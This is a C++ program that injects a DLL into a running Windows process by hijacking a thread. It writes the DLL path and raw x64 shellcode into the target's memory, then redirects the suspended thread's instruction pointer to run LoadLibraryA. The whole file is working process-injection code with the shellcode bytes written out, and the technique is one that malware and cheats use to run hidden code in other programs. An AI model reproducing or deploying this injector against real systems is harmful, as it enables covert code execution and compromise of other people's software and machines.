#include "stdafx.h"

#include "memoryapi.h"

#pragma comment(lib, "onecore.lib")

DWORD ProcessID = 12748;
const char *DllName = "C:\\dev\\Dummy_DLL\\x64\\Release\\Dummy_DLL.dll";
const char *ModName = "KERNEL32.DLL";

int main() {
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessID);

  uintptr_t KernelBase = Inject::GetModuleBase(ProcessID, ModName);

  printf("[+] KERNEL32.DLL Base: %llX\n\n", KernelBase);

  uintptr_t LoadLibraryA = (uintptr_t)(KernelBase + 0x20830);

  printf("[+] LoadLibraryA: %llX\n\n", LoadLibraryA);

  LPVOID MyBufferSpace = Inject::AllocNearKernel32DLL(hProcess);

  if (MyBufferSpace == nullptr) {
    printf("[-] Failed Allocating Space In Target Process %d\n\n",
           GetLastError());
    return 0;
  }

  printf("[+] MyBufferSpace: %llX\n\n", (uintptr_t)MyBufferSpace);

  printf("[+] Copying DLL Path Into Target\n\n");

  WriteProcessMemory(hProcess, MyBufferSpace, DllName, 42, nullptr);

  /*
    x64 Shell Code. Need to change for x86.
    This is totally hardcoded as of now because the thread I am hijacking is
    always in the same spot, so I dont have to change. Can be done dynamically
    if needed

    The shell code is loading the string from memory into RCX, loading the
    address of LoadLibraryA into RDX, calling RDX (LoadLibraryA), then jumping
    back to the original RIP location
  */
  const char *MyShellCode =
      "\x48\x83\xEC\x28\x48\x8D\x0D\xC5\xFF\xFF\xFF\x48\xBA\x30\x08\x55\xA0\xF9"
      "\x7F\x00\x00\xFF\xD2\x48\x83\xC4\x28\xE9\xB4\x10\x1E\xFE";

  printf("[+] Copying Shellcode into Target\n\n");

  // Adding 48 just to be a few bytes after the string.
  WriteProcessMemory(hProcess, (LPVOID)((uintptr_t)MyBufferSpace + 48),
                     MyShellCode, 32, nullptr);

  /*
    Hijack the thread
  */
  HANDLE hThread = Inject::GetThreadFromProcess(ProcessID);

  if (hThread == INVALID_HANDLE_VALUE)
    return 0;

  CONTEXT ctx = {};
  ctx.ContextFlags = CONTEXT_FULL;

  printf("[+] Suspending Thread\n\n");

  SuspendThread(hThread);

  GetThreadContext(hThread, &ctx);

  printf("[+] Original RIP: %llX\n\n", (uintptr_t)ctx.Rip);

  ctx.Rip = ((uintptr_t)MyBufferSpace + 48);

  printf("[+] New RIP: %llX\n\n", (uintptr_t)ctx.Rip);

  if (!SetThreadContext(hThread, &ctx)) {
    printf("Unable to SetThreadContext\n");
    return 1;
  }

  GetThreadContext(hThread, &ctx);

  printf("[+] Confirmed New RIP: %llX\n\n", (uintptr_t)ctx.Rip);

  printf("[+] Resuming Thread\n\n");

  ResumeThread(hThread);

  printf("[+] Cleaning Up\n\n");

  CloseHandle(hThread);

  CloseHandle(hProcess);

  printf("[+] Successfully Hijacked Thread and Injected DLL.\n\n");

  return 1;
}
